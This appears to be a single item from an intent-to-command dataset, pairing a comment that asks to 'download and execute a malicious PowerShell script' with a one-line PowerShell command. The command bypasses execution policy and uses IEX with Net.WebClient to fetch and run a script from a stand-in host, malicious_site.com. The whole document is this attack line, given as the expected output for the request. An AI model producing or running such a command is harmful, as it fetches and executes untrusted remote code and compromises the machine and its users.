# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server using the -c flag.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious_site.com/malicious_script.ps1')"
